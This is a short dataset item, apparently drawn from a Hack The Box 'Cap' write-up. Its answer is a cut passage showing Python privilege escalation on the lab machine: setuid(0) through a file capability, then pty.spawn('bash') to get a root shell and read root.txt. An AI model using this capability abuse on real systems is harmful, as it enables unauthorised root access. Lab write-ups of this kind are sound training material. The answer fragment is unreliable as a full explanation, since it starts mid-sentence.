@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Cap Hacks Stuff)
+
+CONTEXT:
+Source: Htb Cap Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+to root: >>> import os >>> os . setuid ( 0 ) I can try to set the group id, but I don’t have that permission: >>> os . setgid ( 0 ) Traceback (most recent call last): File "<stdin>", line 1, in <module> PermissionError: [Errno 1] Operation not permitted There is a cap_setgid capability as well that was not set here. Now using pty to get a shell again gives a shell as the root user: >>> pty . spawn ( " bash " ) root@cap:/var/www/html# id uid=0(root) gid=1001(nathan) groups=1001(nathan) From there I can grab root.txt : root@cap:/var/www/html# cd /root/ root@cap:/root# cat root.txt f766c793************************
